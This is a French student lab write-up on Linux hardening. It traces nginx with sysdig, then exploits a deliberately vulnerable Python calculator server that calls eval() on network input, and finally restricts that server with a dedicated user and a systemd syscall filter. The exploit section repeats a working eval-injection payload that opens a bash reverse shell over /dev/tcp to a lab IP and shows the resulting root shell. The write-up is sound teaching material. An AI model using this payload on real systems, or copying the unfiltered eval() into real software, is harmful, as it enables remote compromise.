43420 16:07:22.174243627 0 nginx (1345.1345) < execve res=0 exe=/usr/sbin/nginx args=NULL tid=1345(nginx) pid=1345(nginx) ptid=1341(sudo) cwd=<NA> fdlimit=1024 pgft_maj=1 pgft_min=41 vm_size=1792 vm_rss=0 vm_swap=0 comm=nginx cgroups=cpuset=/.cpu=/.cpuacct=/.io=/.memory=/user.slice/user-1000.slice/session-3.sc... env=HISTSIZE=1000.HOSTNAME=vbox.LANG=en_US.UTF-8.LS_COLORS=rs=0:di=01;34:ln=01;36... tty=34817 pgid=1341(sudo) loginuid=1000(telos) flags=1(EXE_WRITABLE) cap_inheritable=0 cap_permitted=1FFFFFFFFFF cap_effective=1FFFFFFFFFF exe_ino=50430358 exe_ino_ctime=2025-03-13 15:54:32.763537952 exe_ino_mtime=2024-11-08 17:44:11.000000000 uid=0(root) trusted_exepath=/usr/sbin/nginx
43421 16:07:22.174258857 0 nginx (1345.1345) > brk addr=0
43422 16:07:22.174259177 0 nginx (1345.1345) < brk res=55DEC5B5E000 vm_size=1792 vm_rss=128 vm_swap=0
43432 16:07:22.175224038 0 nginx (1345.1345) > arch_prctl
43433 16:07:22.175224586 0 nginx (1345.1345) < arch_prctl
43434 16:07:22.175297128 0 nginx (1345.1345) > switch next=0 pgft_maj=1 pgft_min=51 vm_size=1792 vm_rss=128 vm_swap=0
43437 16:07:22.176148484 0 nginx (1345.1345) > access mode=4(R_OK)
43438 16:07:22.176152887 0 nginx (1345.1345) < access res=-2(ENOENT) name=/etc/ld.so.preload
43439 16:07:22.176224229 0 nginx (1345.1345) > switch next=0 pgft_maj=2 pgft_min=53 vm_size=1792 vm_rss=256 vm_swap=0
43441 16:07:22.176964508 0 nginx (1345.1345) > openat dirfd=-100(AT_FDCWD) name=/etc/ld.so.cache flags=4097(O_RDONLY|O_CLOEXEC) mode=0
43442 16:07:22.176968819 0 nginx (1345.1345) < openat fd=3(<f>/etc/ld.so.cache) dirfd=-100(AT_FDCWD) name=/etc/ld.so.cache flags=4097(O_RDONLY|O_CLOEXEC) mode=0 dev=FD00 ino=34185397
43443 16:07:22.176969465 0 nginx (1345.1345) > fstat fd=3(<f>/etc/ld.so.cache)
43444 16:07:22.176970177 0 nginx (1345.1345) < fstat res=0
43445 16:07:22.176970402 0 nginx (1345.1345) > mmap addr=0 length=14083 prot=1(PROT_READ) flags=2(MAP_PRIVATE) fd=3(<f>/etc/ld.so.cache) offset=0
43446 16:07:22.176974987 0 nginx (1345.1345) < mmap res=140079121248256 vm_size=1808 vm_rss=256 vm_swap=0
43447 16:07:22.176975308 0 nginx (1345.1345) > close fd=3(<f>/etc/ld.so.cache)
43448 16:07:22.176975644 0 nginx (1345.1345) < close res=0
43449 16:07:22.176978493 0 nginx (1345.1345) > openat dirfd=-100(AT_FDCWD) name=/lib64/libcrypt.so.2 flags=4097(O_RDONLY|O_CLOEXEC) mode=0
43450 16:07:22.176982792 0 nginx (1345.1345) < openat fd=3(<f>/lib64/libcrypt.so.2) dirfd=-100(AT_FDCWD) name=/lib64/libcrypt.so.2 flags=4097(O_RDONLY|O_CLOEXEC) mode=0 dev=FD00 ino=50504754
43451 16:07:22.176983177 0 nginx (1345.1345) > read fd=3(<f>/lib64/libcrypt.so.2) size=832
43452 16:07:22.176984541 0 nginx (1345.1345) < read res=832 data=.ELF..............>.....P ......@.......(...........@.8...@.....................
43453 16:07:22.176985147 0 nginx (1345.1345) > fstat fd=3(<f>/lib64/libcrypt.so.2)
43454 16:07:22.176985395 0 nginx (1345.1345) < fstat res=0
43455 16:07:22.176985671 0 nginx (1345.1345) > mmap addr=0 length=8192 prot=3(PROT_READ|PROT_WRITE) flags=10(MAP_PRIVATE|MAP_ANONYMOUS) fd=-1(EPERM) offset=0
43456 16:07:22.176987212 0 nginx (1345.1345) < mmap res=140079121240064 vm_size=1816 vm_rss=256 vm_swap=0
43457 16:07:22.176991149 0 nginx (1345.1345) > mmap addr=0 length=233728 prot=1(PROT_READ) flags=1026(MAP_PRIVATE|MAP_DENYWRITE) fd=3(<f>/lib64/libcrypt.so.2) offset=0
43458 16:07:22.176993002 0 nginx (1345.1345) < mmap res=140079121002496 vm_size=2048 vm_rss=256 vm_swap=0
43459 16:07:22.176993173 0 nginx (1345.1345) > mprotect addr=7F66B63F9000 length=188416 prot=0(PROT_NONE)
43460 16:07:22.176997074 0 nginx (1345.1345) < mprotect res=0
43461 16:07:22.176997740 0 nginx (1345.1345) > mmap addr=7F66B63F9000 length=81920 prot=5(PROT_READ|PROT_EXEC) flags=1030(MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE) fd=3(<f>/lib64/libcrypt.so.2) offset=8192
43462 16:07:22.177001724 0 nginx (1345.1345) < mmap res=140079121010688 vm_size=2048 vm_rss=256 vm_swap=0
43463 16:07:22.177001950 0 nginx (1345.1345) > mmap addr=7F66B640D000 length=102400 prot=1(PROT_READ) flags=1030(MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE) fd=3(<f>/lib64/libcrypt.so.2) offset=90112
43464 16:07:22.177004479 0 nginx (1345.1345) < mmap res=140079121092608 vm_size=2048 vm_rss=256 vm_swap=0
43465 16:07:22.177004677 0 nginx (1345.1345) > mmap addr=7F66B6427000 length=4096 prot=3(PROT_READ|PROT_WRITE) flags=1030(MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE) fd=3(<f>/lib64/libcrypt.so.2) offset=192512
43466 16:07:22.177007719 0 nginx (1345.1345) < mmap res=140079121199104 vm_size=2048 vm_rss=256 vm_swap=0
43467 16:07:22.177007944 0 nginx (1345.1345) > mmap addr=7F66B6428000 length=33024 prot=3(PROT_READ|PROT_WRITE) flags=14(MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS) fd=-1(EPERM) offset=0
43468 16:07:22.177009574 0 nginx (1345.1345) < mmap res=140079121203200 vm_size=2048 vm_rss=256 vm_swap=0
43469 16:07:22.177014613 0 nginx (1345.1345) > close fd=3(<f>/lib64/libcrypt.so.2)
43470 16:07:22.177014919 0 nginx (1345.1345) < close res=0
43471 16:07:22.177016590 0 nginx (1345.1345) > openat dirfd=-100(AT_FDCWD) name=/lib64/libpcre.so.1 flags=4097(O_RDONLY|O_CLOEXEC) mode=0
43472 16:07:22.177020680 0 nginx (1345.1345) < openat fd=3(<f>/lib64/libpcre.so.1) dirfd=-100(AT_FDCWD) name=/lib64/libpcre.so.1 flags=4097(O_RDONLY|O_CLOEXEC) mode=0 dev=FD00 ino=50505736
43473 16:07:22.177021113 0 nginx (1345.1345) > read fd=3(<f>/lib64/libpcre.so.1) size=832
43474 16:07:22.177022130 0 nginx (1345.1345) < read res=832 data=.ELF..............>......#......@........m..........@.8...@.....................
43475 16:07:22.177022465 0 nginx (1345.1345) > fstat fd=3(<f>/lib64/libpcre.so.1)
43476 16:07:22.177022842 0 nginx (1345.1345) < fstat res=0
...
```

Après consultation de la page nginx : ``curl http://10.1.1.12/``

```
[telos@vbox ~]$ sudo sysdig proc.name=nginx
1950 16:09:24.860370923 1 nginx (1348.1348) < epoll_wait res=1
1951 16:09:24.860383670 1 nginx (1348.1348) > accept4 flags=0
1952 16:09:24.860390899 1 nginx (1348.1348) < accept4 fd=8(<4t>10.1.1.12:60884->10.1.1.12:80) tuple=10.1.1.12:60884->10.1.1.12:80 queuepct=0 queuelen=0 queuemax=511
1953 16:09:24.860397446 1 nginx (1348.1348) > epoll_ctl
1954 16:09:24.860400184 1 nginx (1348.1348) < epoll_ctl
1955 16:09:24.860401586 1 nginx (1348.1348) > epoll_wait maxevents=512
1956 16:09:24.860402298 1 nginx (1348.1348) < epoll_wait res=1
1957 16:09:24.860403513 1 nginx (1348.1348) > recvfrom fd=8(<4t>10.1.1.12:60884->10.1.1.12:80) size=1024
1958 16:09:24.860405619 1 nginx (1348.1348) < recvfrom res=73 data=GET / HTTP/1.1..Host: 10.1.1.12..User-Agent: curl/7.76.1..Accept: */*.... tuple=10.1.1.12:60884->10.1.1.12:80
1959 16:09:24.860419275 1 nginx (1348.1348) > newfstatat
1960 16:09:24.860427413 1 nginx (1348.1348) < newfstatat res=0 dirfd=-100(AT_FDCWD) path=/usr/share/nginx/html/index.html flags=0
1961 16:09:24.860429888 1 nginx (1348.1348) > openat dirfd=-100(AT_FDCWD) name=/usr/share/nginx/html/index.html flags=65(O_NONBLOCK|O_RDONLY) mode=0
1962 16:09:24.860433234 1 nginx (1348.1348) < openat fd=9(<f>/usr/share/nginx/html/index.html) dirfd=-100(AT_FDCWD) name=/usr/share/nginx/html/index.html flags=65(O_NONBLOCK|O_RDONLY) mode=0 dev=FD00 ino=17107267
1963 16:09:24.860433895 1 nginx (1348.1348) > fstat fd=9(<f>/usr/share/nginx/html/index.html)
1964 16:09:24.860434337 1 nginx (1348.1348) < fstat res=0
1965 16:09:24.860443307 1 nginx (1348.1348) > setsockopt
1966 16:09:24.860444427 1 nginx (1348.1348) < setsockopt res=0 fd=8(<4t>10.1.1.12:60884->10.1.1.12:80) level=2(SOL_TCP) optname=0(UNKNOWN) val=.... optlen=4
1967 16:09:24.860444975 1 nginx (1348.1348) > writev fd=8(<4t>10.1.1.12:60884->10.1.1.12:80) size=240
1968 16:09:24.860449530 1 nginx (1348.1348) < writev res=240 data=HTTP/1.1 200 OK..Server: nginx/1.20.1..Date: Thu, 13 Mar 2025 15:09:24 GMT..Cont
1969 16:09:24.860450347 1 nginx (1348.1348) > sendfile out_fd=8(<4t>10.1.1.12:60884->10.1.1.12:80) in_fd=9(<f>/usr/share/nginx/html/index.html) offset=0 size=7620
1970 16:09:24.860454713 1 nginx (1348.1348) < sendfile res=7620 offset=7620
1971 16:09:24.860459860 1 nginx (1348.1348) > write fd=5(<f>/var/log/nginx/access.log) size=91
1972 16:09:24.860475297 1 nginx (1348.1348) < write res=91 data=10.1.1.12 - - [13/Mar/2025:16:09:24 +0100] "GET / HTTP/1.1" 200 7620 "-" "curl/7
1973 16:09:24.860475911 1 nginx (1348.1348) > close fd=9(<f>/usr/share/nginx/html/index.html)
1974 16:09:24.860477018 1 nginx (1348.1348) < close res=0
1975 16:09:24.860478112 1 nginx (1348.1348) > setsockopt
1976 16:09:24.860535616 1 nginx (1348.1348) < setsockopt res=0 fd=8(<4t>10.1.1.12:60884->10.1.1.12:80) level=2(SOL_TCP) optname=0(UNKNOWN) val=.... optlen=4
1977 16:09:24.860537925 1 nginx (1348.1348) > epoll_wait maxevents=512
1978 16:09:24.860540517 1 nginx (1348.1348) > switch next=0 pgft_maj=2 pgft_min=308 vm_size=15524 vm_rss=5944 vm_swap=0
2683 16:09:24.863183992 1 nginx (1348.1348) < epoll_wait res=1
2684 16:09:24.863188208 1 nginx (1348.1348) > recvfrom fd=8(<4t>10.1.1.12:60884->10.1.1.12:80) size=1024
2685 16:09:24.863190002 1 nginx (1348.1348) < recvfrom res=0 data=NULL tuple=10.1.1.12:60884->10.1.1.12:80
2686 16:09:24.863191090 1 nginx (1348.1348) > close fd=8(<4t>10.1.1.12:60884->10.1.1.12:80)
2687 16:09:24.863211795 1 nginx (1348.1348) < close res=0
2688 16:09:24.863213181 1 nginx (1348.1348) > epoll_wait maxevents=512
2689 16:09:24.863214406 1 nginx (1348.1348) > switch next=17 pgft_maj=2 pgft_min=308 vm_size=15524 vm_rss=5944 vm_swap=0
```

Après l'enregistrement du ``sysdig`` et son analyse :

``sudo sysdig proc.name=nginx -w nginx.scap``

```
[telos@vbox ~]$ sysdig -r nginx.scap | cut -d' ' -f7 | sort | uniq | tr -s '\n' ' '
accept4 access arch_prctl bind brk clone close connect dup2 epoll_create epoll_create1 epoll_ctl epoll_wait eventfd2 execve exit_group fcntl fstat futex getdents64 geteuid getpid getppid getrandom gettid ioctl io_setup listen lseek mkdir mmap mprotect munmap newfstatat openat prctl prlimit procexit pwrite read recvfrom recvmsg rseq rt_sigaction rt_sigprocmask rt_sigreturn rt_sigsuspend sendfile sendmsg sendto setgid setgroups set_robust_list setsid setsockopt set_tid_address setuid signaldeliver socket socketpair statfs switch sysinfo timerfd_create timerfd_settime umask uname unlink wait4 write writev
```

🌞 HARDEN

Le fichier de conf de nginx avec le principe du moindre privilège: [nginx.service](nginx.service)

# Part IV : My shitty app

🌞 Téléchargez l'app Python dans votre VM

```
[telos@vbox ~]$ cd /opt
[telos@vbox opt]$ sudo curl https://gitlab.com/it4lik/b3y-csec-2024/-/raw/main/tp/2/calc.py -o calc.py
[sudo] password for telos:
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   659  100   659    0     0   1279      0 --:--:-- --:--:-- --:--:--  1279
[telos@vbox opt]$ ls
calc.py
[telos@vbox opt]$ cat calc.py
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 13337))

s.listen(1)
conn, addr = s.accept()

while True:

    try:
        # Send un ptit hello
        conn.send("Hello".encode())

        # On attend de recevoir un calcul du client
        data = conn.recv(1024)
        data = data.decode().strip("\n")

        # Evaluation et envoi du résultat
        res = eval(data)
        conn.send(str(res).encode())
        print("Réponse envoyée au client.")

    except socket.error:
        print("Une erreur est survenue, déso.")
        break

conn.close()
```

🌞 Lancer l'application dans votre VM

```
[telos@vbox opt]$ python3 /opt/calc.py

```

```
[telos@vbox opt]$ sudo firewall-cmd --add-port=13337/tcp --permanent
[sudo] password for telos:
success
[telos@vbox opt]$
```

```
telos@TELOS-COMPUTER:~$ nc 10.1.1.12 13337
Hello3+3
6Hello
```

🌞 Créer un service calculatrice.service

```
[telos@vbox opt]$ sudo cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super serveur calculatrice

[Service]
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always
```

🌞 Indiquer à systemd que vous avez modifié les services

```
[telos@vbox opt]$ sudo systemctl daemon-reload
```

🌞 Vérifier que ce nouveau service est bien reconnu*

```
[telos@vbox opt]$ systemctl status calculatrice
○ calculatrice.service - Super serveur calculatrice
     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
     Active: inactive (dead)
```

🌞 Vous devez pouvoir utiliser l'application normalement :

```
[telos@vbox opt]$ sudo systemctl start calculatrice
[telos@vbox opt]$ sudo systemctl status calculatrice
● calculatrice.service - Super serveur calculatrice
     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
     Active: active (running) since Wed 2025-03-19 15:56:18 CET; 3s ago
   Main PID: 1863 (python3)
      Tasks: 1 (limit: 23155)
     Memory: 3.3M
        CPU: 14ms
     CGroup: /system.slice/calculatrice.service
             └─1863 /usr/bin/python3 /opt/calc.py

Mar 19 15:56:18 vbox systemd[1]: Started Super serveur calculatrice.
[telos@vbox opt]$
```

```
telos@TELOS-COMPUTER:~$ nc 10.1.1.12 13337
Hello10+10
20Hello
```

🌞 Hack l'application

```
telos@TELOS-COMPUTER:~$ echo "__import__('os').system('bash -i >& /dev/tcp/172.27.206.51/4444 0>&1')" | nc 10.1.1.12 13337
Hello
```

```
telos@TELOS-COMPUTER:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 172.27.192.1 59002
bash: cannot set terminal process group (1902): Inappropriate ioctl for device
bash: no job control in this shell
[root@vbox /]# id
id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
```

La fonction vulnérable est donc ``eval()`` car il n'y a aucun filtre, l'utilisateur peut injecter n'importe quel payload.

Ici le payload qu'on utilise est : ``__import__('os').system('bash -i >& /dev/tcp/172.27.206.51/4444 0>&1')`` afin d'avoir un reverse shell en tant que root.

🌞 Prouvez que le service s'exécute actuellement en root

```
[telos@vbox ~]$ systemctl status calculatrice.service
● calculatrice.service - Super serveur calculatrice
     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
     Active: active (running) since Thu 2025-03-27 14:26:44 CET; 5min ago
   Main PID: 1327 (python3)
      Tasks: 1 (limit: 23155)
     Memory: 3.3M
        CPU: 18ms
     CGroup: /system.slice/calculatrice.service
             └─1327 /usr/bin/python3 /opt/calc.py

Mar 27 14:26:44 vbox systemd[1]: Started Super serveur calculatrice.

[telos@vbox ~]$ ps aux | grep root | grep calc.py
root        1327  0.0  0.2  10904  8576 ?        Ss   14:26   0:00 /usr/bin/python3 /opt/calc.py
```

🌞 Créer l'utilisateur calculatrice

```
[telos@vbox ~]$ sudo useradd --system --no-create-home --shell /sbin/nologin calculatrice
[sudo] password for telos:
[telos@vbox ~]$ getent passwd calculatrice
calculatrice:x:995:992::/home/calculatrice:/sbin/nologin
```

🌞 Adaptez les permissions

```
[telos@vbox ~]$ sudo chown calculatrice:calculatrice /opt/calc.py
[telos@vbox ~]$ sudo chmod 500 /opt/calc.py
[telos@vbox ~]$ ls -la /opt/calc.py
-r-x------. 1 calculatrice calculatrice 659 Mar 19 15:09 /opt/calc.py
```

🌞 Modifier le .service

```
[telos@vbox ~]$ systemctl status calculatrice.service
● calculatrice.service - Super serveur calculatrice
     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
     Active: active (running) since Thu 2025-03-27 14:38:23 CET; 35s ago
   Main PID: 1433 (python3)
      Tasks: 1 (limit: 23155)
     Memory: 3.3M
        CPU: 13ms
     CGroup: /system.slice/calculatrice.service
             └─1433 /usr/bin/python3 /opt/calc.py

Mar 27 14:38:23 vbox systemd[1]: Started Super serveur calculatrice.

[telos@vbox ~]$ sudo cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super serveur calculatrice

[Service]
User=calculatrice
Group=calculatrice
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always
```

🌞 Prouvez que le service s'exécute désormais en tant que calculatrice

```
[telos@vbox ~]$ systemctl status calculatrice.service
● calculatrice.service - Super serveur calculatrice
     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
     Active: active (running) since Thu 2025-03-27 14:40:34 CET; 1min 35s ago
   Main PID: 1467 (python3)
      Tasks: 1 (limit: 23155)
     Memory: 3.3M
        CPU: 12ms
     CGroup: /system.slice/calculatrice.service
             └─1467 /usr/bin/python3 /opt/calc.py

Mar 27 14:40:34 vbox systemd[1]: Started Super serveur calculatrice.

[telos@vbox ~]$ ps aux | grep calcula | grep calc.py
calcula+    1467  0.0  0.2  10844  8192 ?        Ss   14:40   0:00 /usr/bin/python3 /opt/calc.py
```

🌞 Tracez l'exécution de l'application : normal

```
[telos@vbox ~]$ sudo sysdig proc.name=python3 -w calc.scap

```

```
telos@TELOS-COMPUTER:~$ nc 10.1.1.12 13337
Hello3+3
6Hello6-6
0Hello8/2
4.0Hello4%2
0Hello5*4
20Hello^C
telos@TELOS-COMPUTER:~$
```

```
[telos@vbox ~]$ sysdig -r calc.scap | cut -d' ' -f7 | sort | uniq | tr -s '\n' ' '
accept4 access arch_prctl bind brk close dup epoll_create1 execve exit_group fcntl fstat futex getdents64 getegid geteuid getgid getpeername getrandom getsockname getuid ioctl listen lseek mmap mprotect munmap newfstatat openat pread prlimit procexit read readlink recvfrom rseq rt_sigaction sendto set_robust_list setsockopt set_tid_address socket switch sysinfo write
```

🌞 Tracez l'exécution de l'application : hack

```
[telos@vbox ~]$ sudo sysdig proc.name=python3 -w Hackcalc.scap

```

```
telos@TELOS-COMPUTER:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444

```

```
telos@TELOS-COMPUTER:~$ echo "__import__('os').system('bash -i >& /dev/tcp/172.27.206.51/4444 0>&1')" | nc 10.1.1.12 13337
Hello
```

```
telos@TELOS-COMPUTER:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 172.27.192.1 32902
bash: cannot set terminal process group (1565): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ id
id
uid=995(calculatrice) gid=992(calculatrice) groups=992(calculatrice) context=system_u:system_r:unconfined_service_t:s0
bash-5.1$
```

```
[telos@vbox ~]$ sysdig -r Hackcalc.scap | cut -d' ' -f7 | sort | uniq | tr -s '\n' ' '
accept4 access arch_prctl bind brk clone3 close dup epoll_create1 execve exit_group fcntl fstat futex getdents64 getegid geteuid getgid getpeername getrandom getsockname getuid ioctl listen lseek mmap mprotect munmap newfstatat openat pread prlimit procexit read readlink recvfrom rseq rt_sigaction rt_sigprocmask sendto set_robust_list setsockopt set_tid_address signaldeliver socket switch sysinfo wait4 write
```

On remarque 4 nouveaux syscalls uniquement présent lors du Hack de l'application calc.py : ``clone3``, ``rt_sigprocmask``, ``signaldeliver``, ``wait4``

🌞 Adaptez le .service

```
[telos@vbox ~]$ sudo cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super serveur calculatrice

[Service]
User=calculatrice
Group=calculatrice
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always
SystemCallFilter=~clone3 rt_sigprocmask signaldeliver wait4
```

```
telos@TELOS-COMPUTER:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444

```

```
telos@TELOS-COMPUTER:~$ echo "__import__('os').system('bash -i >& /dev/tcp/172.27.206.51/4444 0>&1')" | nc 10.1.1.12 13337
Hellotelos@TELOS-COMPUTER:~$ nc 10.1.1.12 13337
Hello3+3
6Hello9%2
1Hello^C
```

L'exploitation est devenue plus compliquée car lorsqu'on veut injecter le payload, le nc est directement coupé. Mais lors d'une utilisation normal de la calculatrice, tout fonctionne.